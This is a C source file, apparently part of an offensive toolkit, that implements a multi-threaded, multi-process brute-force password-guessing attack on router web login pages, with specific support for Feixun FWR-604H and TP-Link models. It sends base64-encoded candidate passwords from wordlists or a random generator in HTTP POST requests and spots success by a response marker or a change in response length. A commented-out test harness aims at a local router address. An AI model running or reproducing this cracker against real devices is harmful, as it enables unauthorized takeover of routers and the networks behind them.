#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <pthread.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <signal.h>
#include <unistd.h>
#include <sys/types.h>

#include "../main.h"
#include "attack_guess.h"
#include "router/feixun.h"
#include "router/tplink.h"

// waste too many time in the guess password module
// and now this module will not work any more until dos module compelete

// from ../core/debug.c
extern int DisplayDebug(const int message_debug_level, const int user_debug_level, const char *fmt, ...);
extern int DisplayInfo(const char *fmt, ...);
extern int DisplayWarning(const char *fmtsring, ...);
extern int DisplayError(const char *fmt, ...);

// from ../core/str.c
extern char *GetRandomPassword(char **rebuf, unsigned int seed, const int length);
extern void FreeSplitURLBuff(pSplitURLOutput p);
extern pSplitURLOutput SplitURL(const char *url, pSplitURLOutput *output);
extern void FreeRandomPasswordBuff(char *password);
extern void FreeProcessFileBuff(pStrHeader p);
extern pStrHeader ProcessGuessAttackFile(const char *path, pStrHeader *output, int flag);
extern int LocateStrNodeElement(const pStrHeader p, pStrNode *element, const size_t loc);

// from ../core/http.c
extern size_t HTTPMethod(const char *url, const char *request, char **response, int debug_level);
extern void FreeHTTPMethodBuff(char *p);
extern size_t HTTPSMethod(const char *url, const char *request, char **response, int debug_level);
extern void FreeHTTPSMethodBuff(char *p);

// from ../core/base64.c
extern size_t Base64Encode(char **b64message, const unsigned char *buffer, size_t length);
extern size_t Base64Decode(unsigned char **buffer, char *b64message);
extern void FreeBase64(char *b64message);

// value for check
char *REQUEST;
char *REQUEST_DATA;
char *SUCCESS_MODEL;

int CHECK = CheckModel;
char *RESPONSE;
int RESPONSE_LENGTH = 0;
int WATCH_LENGTH = 0;

static void FreeMatchModelBuff(pMatchOutput p)
{
    if (p)
    {
        free(p);
    }
}

static int MatchModel(pMatchOutput *output, const char *input)
{
    // rude way
    if (strstr(input, "feixun_fwr_604h"))
    {
        (*output) = (pMatchOutput)malloc(sizeof(MatchOutput));
        if (!(*output))
        {
            DisplayError("MatchModel malloc failed");
            return 1;
        }
        (*output)->request = FEIXUN_FWR_604H_POST_REQUEST;
        (*output)->request_data = FEIXUN_FWR_604H_POST_REQUEST_DATA;
        (*output)->success_or_not = FEIXUN_FWR_604H_POST_SUCCESS;
        (*output)->next = NULL;
    }
    else if (strstr(input, "tplink"))
    {
        (*output) = (pMatchOutput)malloc(sizeof(MatchOutput));
        if (!(*output))
        {
            DisplayError("MatchModel malloc failed");
            return 1;
        }
        (*output)->request = TPLINK_POST_REQUEST;
        (*output)->request_data = TPLINK_POST_REQUEST_DATA;
        (*output)->success_or_not = TPLINK_SUCCESS;
        (*output)->next = NULL;
    }
    else if (strstr(input, "not_sure"))
    {
        // defalut value for test
        MatchModel(output, MODEL_TYPE_DEFAULT);
    }
    else
    {
        DisplayError("Can not found that model: %s", input);
        return 1;
    }

    return 0;
}

static int CheckResponse(void)
{
    // if SUCCESS_MODEL in the respoonse, we get the right password

    if (CHECK == CheckModel)
    {
        if (strstr(RESPONSE, SUCCESS_MODEL))
        {
            DisplayInfo("Found the password");
            return 0;
        }
    }
    else if (CHECK == CheckLength)
    {
        if (WATCH_LENGTH == RESPONSE_LENGTH)
        {
            DisplayInfo("Found the password");
            return 0;
        }
    }

    return 1;
}

static int UListPList(pInput input, size_t u_start, size_t u_end, size_t p_start, size_t p_end)
{
    // username is a list and password is list too
    if (!(input->gau->u_header))
    {
        DisplayError("UListPList get u_header failed");
        return 1;
    }
    pStrNode us;
    if (LocateStrNodeElement(input->gau->u_header, &us, u_start))
    {
        DisplayError("UListPList LocateStrNodeElement failed");
        return 1;
    }
    pStrNode ue;
    if (LocateStrNodeElement(input->gau->u_header, &ue, u_end))
    {
        DisplayError("UListPList LocateStrNodeElement failed");
        return 1;
    }
    pStrNode ps;
    if (LocateStrNodeElement(input->gau->p_header, &ps, p_start))
    {
        DisplayError("UListPList LocateStrNodeElement failed");
        return 1;
    }
    pStrNode pe;
    if (LocateStrNodeElement(input->gau->p_header, &pe, p_end))
    {
        DisplayError("UListPList LocateStrNodeElement failed");
        return 1;
    }
    pStrNode p;
    char *b64message;
    char *response;
    char request[strlen(REQUEST) + SEND_DATA_SIZE + 1];
    char data[SEND_DATA_SIZE + 1];
    pSplitURLOutput sp;

    if (!SplitURL(input->address, &sp))
    {
        DisplayError("SplitURL failed");
        return 1;
    }
    while (us != ue)
    {
        if (!(input->gau->p_header))
        {
            DisplayError("UListPList get p_header failed");
            return 1;
        }
        p = ps;
        while (ps != pe)
        {
            // base64
            if (!memset(request, 0, sizeof(request)))
            {
                DisplayError("UListPlist memset failed");
                return 1;
            }
            if (!memset(data, 0, sizeof(data)))
            {
                DisplayError("UListPlist memset failed");
                return 1;
            }
            if (!Base64Encode(&b64message, (unsigned char *)p->str, strlen(p->str)))
            {
                DisplayError("Base64Encode failed");
                return 1;
            }

            // combined data now
            if (!sprintf(data, REQUEST_DATA, us->str, b64message))
            {
                DisplayError("UListPlist sprintf failed");
                return 1;
            }
            if (!sprintf(request, REQUEST, sp->host, input->address, strlen(data), data))
            {
                DisplayError("UListPlist sprintf failed");
                return 1;
            }

            // send now
            DisplayDebug(DEBUG_LEVEL_1, input->debug_level, "try username: %s, password: %s", us->str, p->str);
            if (!HTTPMethod(input->address, request, &response, 0))
            {
                DisplayError("HTTPMethod failed");
                return 1;
            }

            // for debug use
            DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "%s", response);
            if (CHECK == CheckLength)
            {
                RESPONSE_LENGTH = strlen(response);
            }
            else if (CHECK == CheckModel)
            {
                RESPONSE = response;
            }
            // now check
            if (!CheckResponse())
            {
                DisplayInfo("Username: %s - Password: %s", us->str, p->str);
                return 0;
            }
            FreeHTTPMethodBuff(response);
            FreeBase64(b64message);
            p = p->next;
        }
        us = us->next;
    }
    FreeSplitURLBuff(sp);

    return 0;
}

static int UOnePRandom(pInput input)
{
    // just one username and use random password

    char *password;
    char *b64message;
    char request[strlen(REQUEST) + SEND_DATA_SIZE + 1];
    char data[SEND_DATA_SIZE + 1];
    char *response;
    int seed = input->seed;
    pSplitURLOutput sp;

    if (!SplitURL(input->address, &sp))
    {
        DisplayError("SplitURL failed");
        return 1;
    }

    for (;;)
    {
        ++seed;
        if (seed > 1024)
        {
            seed = 0;
        }
        if (!GetRandomPassword(&password, seed, input->random_password_length))
        {
            DisplayError("GetRandomPassword failed");
            return 1;
        }

        // base64
        if (!Base64Encode(&b64message, (unsigned char *)password, strlen(password)))
        {
            DisplayError("Base64Encode failed");
            return 1;
        }

        // combined data now
        if (!sprintf(data, REQUEST_DATA, input->username, b64message))
        {
            DisplayError("UOnePRandom sprintf failed");
            return 1;
        }
        if (!sprintf(request, REQUEST, sp->host, input->address, strlen(data), data))
        {
            DisplayError("UOnePRandom sprintf failed");
            return 1;
        }

        // send now
        DisplayDebug(DEBUG_LEVEL_1, input->debug_level, "try username: %s, password: %s", input->username, password);
        if (!HTTPMethod(input->address, request, &response, 0))
        {
            DisplayError("HTTPMethod failed");
            return 1;
        }
        // for debug
        DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "%s", response);
        if (CHECK == CheckLength)
        {
            RESPONSE_LENGTH = strlen(response);
        }
        else if (CHECK == CheckModel)
        {
            RESPONSE = response;
        }
        if (!CheckResponse())
        {
            DisplayInfo("Username: %s - Password: %s", input->username, password);
            return 0;
        }

        FreeHTTPMethodBuff(response);
        FreeRandomPasswordBuff(password);
        FreeBase64(b64message);
    }

    return 0;
}

static int UOnePList(pInput input, size_t p_start, size_t p_end)
{
    if (!(input->gau->p_header))
    {
        DisplayError("UOnePList get p_header failed");
        return 1;
    }

    pStrNode ps;
    LocateStrNodeElement(input->gau->p_header, &ps, p_start);
    pStrNode pe;
    LocateStrNodeElement(input->gau->p_header, &pe, p_end);
    char *b64message;
    char *response;
    char request[strlen(REQUEST) + SEND_DATA_SIZE + 1];
    char data[SEND_DATA_SIZE + 1];
    pSplitURLOutput sp;

    if (!SplitURL(input->address, &sp))
    {
        DisplayError("SplitURL failed");
        return 1;
    }

    // only use the part of this list
    while (ps != pe)
    {
        // base64
        if (!memset(request, 0, sizeof(request)))
        {
            DisplayError("UOnePList memset failed");
            return 1;
        }
        if (!memset(data, 0, sizeof(data)))
        {
            DisplayError("UOnePList memset failed");
            return 1;
        }
        if (!Base64Encode(&b64message, (unsigned char *)ps->str, strlen(ps->str)))
        {
            DisplayError("Base64Encode failed");
            return 1;
        }

        // combined data now
        if (!sprintf(data, REQUEST_DATA, input->username, b64message))
        {
            DisplayError("UOnePList sprintf failed");
            return 1;
        }
        if (!sprintf(request, REQUEST, sp->host, input->address, strlen(data), data))
        {
            DisplayError("UOnePList sprintf failed");
            return 1;
        }

        // send now
        pthread_t self;
        self = pthread_self();
        DisplayDebug(DEBUG_LEVEL_1, input->debug_level, "tid: %lu, try username: %s, password: %s", self, input->username, ps->str);
        if (!HTTPMethod(input->address, request, &response, 0))
        {
            DisplayError("HTTPMethod failed");
            return 1;
        }

        //DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "%s", response);
        if (CHECK == CheckLength)
        {
            RESPONSE_LENGTH = strlen(response);
        }
        else if (CHECK == CheckModel)
        {
            RESPONSE = response;
        }
        if (!CheckResponse())
        {
            DisplayInfo("Username: %s - Password: %s", input->username, ps->str);
            return 0;
        }
        FreeHTTPMethodBuff(response);
        FreeBase64(b64message);
        ps = ps->next;
    }

    return 0;
}

static int UTestPTest(pInput input, int *length)
{
    char *b64message;
    char *response;
    char request[strlen(REQUEST) + SEND_DATA_SIZE + 1];
    char data[SEND_DATA_SIZE + 1];
    char *test_password = "this_world_only_one_password_is_this";
    pSplitURLOutput sp;

    if (!SplitURL(input->address, &sp))
    {
        DisplayError("UTestPTest SplitURL failed");
        return 1;
    }

    // base64
    if (!memset(request, 0, sizeof(request)))
    {
        DisplayError("UTestPTest memset failed");
        return 1;
    }
    if (!memset(data, 0, sizeof(data)))
    {
        DisplayError("UTestPTest memset failed");
        return 1;
    }
    if (!Base64Encode(&b64message, (unsigned char *)test_password, strlen(test_password)))
    {
        DisplayError("Base64Encode failed");
        return 1;
    }

    // combined data now
    if (!sprintf(data, REQUEST_DATA, input->username, b64message))
    {
        DisplayError("UTestPTest sprintf failed");
        return 1;
    }
    if (!sprintf(request, REQUEST, sp->host, input->address, strlen(data), data))
    {
        DisplayError("UTestPTest sprintf failed");
        return 1;
    }

    // send now
    DisplayDebug(DEBUG_LEVEL_1, input->debug_level, "try username: %s, password: %s", input->username, test_password);
    if (!HTTPMethod(input->address, request, &response, 0))
    {
        DisplayError("HTTPMethod failed");
        return 1;
    }

    DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "%s", response);
    (*length) = (int)strlen(response);
    FreeHTTPMethodBuff(response);
    FreeBase64(b64message);

    return 0;
}

static unsigned long MultiThreadControl(pInput input, size_t *start, size_t *end, int flag)
{
    /*
     * flag == 0 use u_header
     * flag == 1 use p_header
     */
    pthread_t self = pthread_self();
    pThreadControlNode node = input->tch->next;
    size_t cut;
    if (flag == UHEADER)
    {
        cut = (input->gau->u_header->length) / (((size_t)input->max_process) * ((size_t)input->max_thread));
    }
    else if (flag == PHEADER)
    {
        cut = (input->gau->p_header->length) / (((size_t)input->max_process) * ((size_t)input->max_thread));
    }
    while (node)
    {
        if (node->tid == self)
        {
            DisplayDebug(DEBUG_LEVEL_1, input->debug_level, "thread id: %d", node->id);
            *start = (size_t)node->id * cut;
            *end = ((size_t)node->id + 1) * cut;
            return 0;
        }
        node = node->next;
    }
    return self;
}

static int AttackThread(pInput input)
{
    // start attack

    pMatchOutput mt;
    if (MatchModel(&mt, input->model_type))
    {
        DisplayError("MatchModel failed");
        return 1;
    }
    REQUEST = mt->request;
    REQUEST_DATA = mt->request_data;
    SUCCESS_MODEL = mt->success_or_not;

    if (input->guess_attack_type == GUESS_LENGTH)
    {
        CHECK = CheckLength;
        WATCH_LENGTH = input->watch_length;
    }
    else
    {
        CHECK = CheckModel;
    }

    if (input->guess_attack_type == GUESS_GET_RESPONSE_LENGTH)
    {
        int length;
        if (!UTestPTest(input, &length))
        {
            // success
            return length;
        }
        else
            return 1;
    }
    else if (input->guess_attack_type == GUESS_U1PL)
    {
        size_t p_start, p_end;
        pthread_t tid = 0;
        tid = MultiThreadControl(input, &p_start, &p_end, PHEADER);
        if (tid)
        {
            DisplayError("GuessAttack MultiThreadControl can not found the tid");
            DisplayError("tid: %ld", tid);
            return 1;
        }
        if (UOnePList(input, p_start, p_end))
        {
            DisplayError("GuessAttack UOnePList failed");
            return 1;
        }
    }
    else if (input->guess_attack_type == GUESS_U1PR)
    {
        if (UOnePRandom(input))
        {
            DisplayError("GuessAttack UOnePRondom failed");
            return 1;
        }
    }
    else if (input->guess_attack_type == GUESS_ULPL)
    {
        size_t u_start, u_end, p_start, p_end;
        pthread_t tid = 0;
        tid = MultiThreadControl(input, &u_start, &u_end, UHEADER);
        if (tid)
        {
            DisplayError("GuessAttack MultiThreadControl can not found the tid");
            DisplayError("tid: %ld", tid);
            return 1;
        }
        tid = 0;
        tid = MultiThreadControl(input, &p_start, &p_end, PHEADER);
        if (tid)
        {
            DisplayError("GuessAttack MultiThreadControl can not found the tid");
            DisplayError("tid: %ld", tid);
            return 1;
        }
        if (UListPList(input, u_start, u_end, p_start, p_end))
        {
            DisplayError("GuessAttack UListPList failed");
            return 1;
        }
    }
    else
    {
        DisplayError("Unknow guess attack type");
        return 1;
    }
    FreeMatchModelBuff(mt);
    return 0;
}

int StartGuessAttack(const pInput input)
{
    pid_t pid, wpid;
    pthread_t tid[input->max_thread];
    pthread_attr_t attr;
    int i, j, ret;
    int status = 0;
    pThreadControlNode tcn;

    // store the linked list if use the path file
    pGuessAttackUse gau = (pGuessAttackUse)malloc(sizeof(GuessAttackUse));
    gau->u_header = NULL;
    gau->p_header = NULL;
    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Enter StartAttackProcess");

    // we are not allowed the username from linked list but password from random string
    if (input->get_response_length == ENABLE)
    {
        input->guess_attack_type = GUESS_GET_RESPONSE_LENGTH;
        int length = AttackThread(input);
        if (length == -1)
        {
            DisplayError("GuessAttack_Thread failed");
            return 1;
        }
        DisplayInfo("Response length is %d", length);
        return 0;
    }
    else if (input->watch_length > 0)
    {
        input->guess_attack_type = GUESS_LENGTH;
    }
    else if (strlen(input->password_path) > 0)
    {
        ProcessGuessAttackFile(input->password_path, &(gau->p_header), 1);
        if (strlen(input->username_path) > 0)
        {
            ProcessGuessAttackFile(input->username_path, &(gau->u_header), 0);
            input->guess_attack_type = GUESS_ULPL;
        }
        else
        {
            input->guess_attack_type = GUESS_U1PL;
        }
    }
    else
    {
        input->guess_attack_type = GUESS_U1PR;
    }

    input->gau = gau;
    input->tch = (pThreadControlHeader)malloc(sizeof(ThreadControlHeader));
    input->tch->next = NULL;
    input->tch->length = 0;

    extern void SignalExit(int signo);
    signal(SIGINT, SignalExit);
    if (input->max_process <= 1)
    {
        // only one process
        for (j = 0; j < input->max_thread; j++)
        {
            //input->serial_num = (i * input->max_thread) + j;
            tcn = (pThreadControlNode)malloc(sizeof(ThreadControlNode));
            input->seed = j;
            if (pthread_attr_init(&attr))
            {
                DisplayError("StartGuess pthread_attr_init failed");
                return 1;
            }
            //if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
            if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
            {
                DisplayError("StartGuess pthread_attr_setdetachstate failed");
                return 1;
            }
            // create thread
            ret = pthread_create(&tid[j], &attr, (void *)AttackThread, input);
            //printf("j is: %d\n", j);
            DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "tid: %ld", tid[j]);
            // here we make a map
            tcn->tid = tid[j];
            tcn->id = j;
            if (ret != 0)
            {
                DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "ret: %d", ret);
                DisplayError("Create pthread failed");
                return 1;
            }
            tcn->next = input->tch->next;
            input->tch->next = tcn;
            pthread_attr_destroy(&attr);
        }
        //pthread_detach(tid);
        // join them all
        for (j = 0; j < input->max_thread; j++)
        {
            pthread_join(tid[j], NULL);
        }
    }
    else
    {
        // muti process
        for (i = 0; i < input->max_process; i++)
        {
            pid = fork();
            DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "pid: %d", pid);
            if (pid == 0)
            {
                // child process
                for (j = 0; j < input->max_thread; j++)
                {
                    //input->serial_num = (i * input->max_thread) + j;
                    tcn = (pThreadControlNode)malloc(sizeof(ThreadControlNode));
                    input->seed = i + j;
                    if (pthread_attr_init(&attr))
                    {
                        DisplayError("StartGuess pthread_attr_init failed");
                        return 1;
                    }
                    //if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
                    if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
                    {
                        DisplayError("StartGuess pthread_attr_setdetachstate failed");
                        return 1;
                    }
                    // create thread
                    ret = pthread_create(&tid[j], &attr, (void *)AttackThread, input);
                    //printf("j is: %d\n", j);
                    DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "tid: %ld", tid[j]);
                    // here we make a map
                    tcn->tid = tid[j];
                    tcn->id = j;
                    if (ret != 0)
                    {
                        DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "ret: %d", ret);
                        DisplayError("Create pthread failed");
                        return 1;
                    }
                    tcn->next = input->tch->next;
                    input->tch->next = tcn;
                    pthread_attr_destroy(&attr);
                }
                //pthread_detach(tid);
                // join them all
                for (j = 0; j < input->max_thread; j++)
                {
                    pthread_join(tid[j], NULL);
                }
            }
            else if (pid < 0)
            {
                // Error now
                DisplayError("Create process failed");
            }
            // Father process
            while ((wpid = wait(&status)) > 0)
            {
                // nothing here
                // wait the child process end
            }
        }
    }
    // for test
    //sleep(10);
    if (gau->u_header)
    {
        FreeProcessFileBuff(gau->u_header);
    }
    if (gau->p_header)
    {
        FreeProcessFileBuff(gau->p_header);
    }
    if (gau)
    {
        free(gau);
    }
    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Exit StartAttackProcess");
    return 0;
}

int StartGuessTest(const pInput input)
{
    // store the linked list if use the path file
    pGuessAttackUse gau = (pGuessAttackUse)malloc(sizeof(GuessAttackUse));
    gau->u_header = NULL;
    gau->p_header = NULL;
    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Enter StartAttackTestProcess");

    // we are not allowed the username from linked list but password from random string
    if (input->get_response_length == ENABLE)
    {
        input->guess_attack_type = GUESS_GET_RESPONSE_LENGTH;
        int length = AttackThread(input);
        if (length == -1)
        {
            DisplayError("GuessAttack_Thread failed");
            return 1;
        }
        DisplayInfo("Response length is %d", length);
        return 0;
    }
    else if (input->watch_length > 0)
    {
        input->guess_attack_type = GUESS_LENGTH;
    }
    else if (strlen(input->password_path) > 0)
    {
        if (!ProcessGuessAttackFile(input->password_path, &(gau->p_header), 1))
        {
            DisplayError("ProcessGuessAttackFile failed");
            return 1;
        }
        if (strlen(input->username_path) > 0)
        {
            if (!ProcessGuessAttackFile(input->username_path, &(gau->u_header), 0))
            {
                DisplayError("ProcessGuessAttackFile failed");
                return 1;
            }
            input->guess_attack_type = GUESS_ULPL;
        }
        else
        {
            input->guess_attack_type = GUESS_U1PL;
        }
    }
    else
    {
        input->guess_attack_type = GUESS_U1PR;
    }

    input->gau = gau;
    input->tch = (pThreadControlHeader)malloc(sizeof(ThreadControlHeader));
    input->tch->next = NULL;
    input->tch->length = 0;

    // no thread create for test
    AttackThread(input);

    if (gau->u_header)
    {
        FreeProcessFileBuff(gau->u_header);
    }
    if (gau->p_header)
    {
        FreeProcessFileBuff(gau->p_header);
    }
    if (gau)
    {
        free(gau);
    }
    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Exit StartAttackProcess");
    return 0;
}

/*
int main(void)
{
    // for test
    pInput t_input = (pInput)malloc(sizeof(Input));
    t_input->max_process = 1;
    t_input->max_thread = 1;
    t_input->serial_num = 0;
    memset(t_input->username, 0, sizeof(t_input->username));
    strncpy(t_input->username, "admin", strlen("admin"));
    t_input->debug_level = 1;
    //strncpy(t_input->username_path, "username1.txt", strlen("username1.txt"));
    //memset(t_input->password_path, 0, sizeof(t_input->password_path));
    //strncpy(t_input->password_path, "password.txt", strlen("password.txt"));
    t_input->seed = 10;
    t_input->random_password_length = 8;
    strcpy(t_input->model_type, "feixun_fwr_604h");
    strcpy(t_input->address, "http://192.168.1.1:80/login.asp");

    GuessAttack(t_input);

    char buff[10240] = {'\0'};
    char *resp;
    sprintf(buff, "%s", NEXTCLOUD15_GET_REQUEST);
    HTTPSMethod("https://192.168.1.156", buff, &resp, 3);

    return 0;
}
*/